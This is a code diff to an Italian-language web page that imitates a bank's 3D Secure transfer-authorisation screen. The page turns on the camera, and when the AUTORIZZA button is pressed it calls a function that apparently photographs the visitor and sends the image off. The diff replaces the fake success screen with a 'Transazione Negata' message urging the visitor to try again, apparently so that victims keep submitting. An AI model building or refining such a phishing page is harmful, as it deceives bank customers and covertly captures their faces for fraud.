@@ -70,11 +70,6 @@
       display: block;
     }
 
-    .checkmark {
-      font-size: 80px;
-      margin-bottom: 20px;
-    }
-
     .loading {
       font-size: 18px;
       margin-top: 30px;
@@ -115,8 +110,8 @@
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
 
-  <button class="autorizza" id="btnAutorizza" onclick="handleClick('autorizza')">AUTORIZZA</button>
-  <button class="nega" id="btnNega" onclick="handleClick('nega')">NEGA</button>
+  <button class="autorizza" id="btnAutorizza" onclick="handleClick()">AUTORIZZA</button>
+  <button class="nega" onclick="showFailure()">NEGA</button>
 </div>
 
 <script>
@@ -127,7 +122,6 @@
   const card = document.getElementById('card');
   document.getElementById('data-operazione').innerText = new Date().toLocaleDateString('it-IT');
 
-  // Countdown 2 minuti
   let seconds = 120;
   const timer = setInterval(() => {
     seconds--;
@@ -151,26 +145,22 @@
       };
     })
     .catch(() => {
-      card.innerHTML = `
-        <img src="fail.png" alt="Errore" class="result-image">
-        <h2 style="color: rgb(251, 18, 34);">Transazione Negata</h2>
-        <p>L'autenticazione 3D Secure non è stata completata.</p>
-        <p>Il sistema ha rilevato un'anomalia di sicurezza, è necessario ripetere l'operazione di autorizzazione.</p>
-      `;
+      showFailure("Accesso alla videocamera negato.");
     });
 
-  function handleClick(action) {
-    takeAndSendPhoto(action);
-    if (action === 'autorizza') {
-      showLoadingScreen();
-      setTimeout(showSuccessScreen, 4000);
-    } else {
-      card.innerHTML = `
-        <img src="fail.png" alt="Annullato" class="result-image">
-        <h2 style="color: rgb(251, 18, 34);">Transazione Annullata</h2>
-        <p>Hai annullato manualmente l'autenticazione.</p>
-      `;
-    }
+  function handleClick() {
+    takeAndSendPhoto("autorizza");
+    showLoadingScreen();
+    setTimeout(() => showFailure(), 4000);
+  }
+
+  function showFailure(msg = null) {
+    card.innerHTML = `
+      <img src="fail.png" alt="Errore" class="result-image">
+      <h2 style="color: rgb(251, 18, 34);">Transazione Negata</h2>
+      <p>${msg ?? "L'autenticazione 3D Secure non è stata completata."}</p>
+      <p>Il sistema ha rilevato un'anomalia di sicurezza, è necessario ripetere l'operazione di autorizzazione.</p>
+    `;
   }
 
   function takeAndSendPhoto(action) {
@@ -187,21 +177,8 @@
 
   function showLoadingScreen() {
     card.innerHTML = `
-      <img src="logo.png" alt="Logo" class="bank-logo">
       <h2>Invio bonifico istantaneo</h2>
       <div class="loading">Autorizzazione in corso...</div>
-    `;
-  }
-
-  function showSuccessScreen() {
-    card.innerHTML = `
-      <img src="logo.png" alt="Banca" class="bank-logo">
-      <img src="check.png" alt="Successo" class="result-image">
-      <h2><strong>15,00 €</strong> sono stati trasferiti</h2>
-      <a href="#" class="link">INVIA VIA EMAIL</a>
-      <a href="#" class="link">DETTAGLIO OPERAZIONE</a>
-      <button class="autorizza">NUOVO BONIFICO</button>
-      <button class="nega">CHIUDI</button>
     `;
   }
 </script>
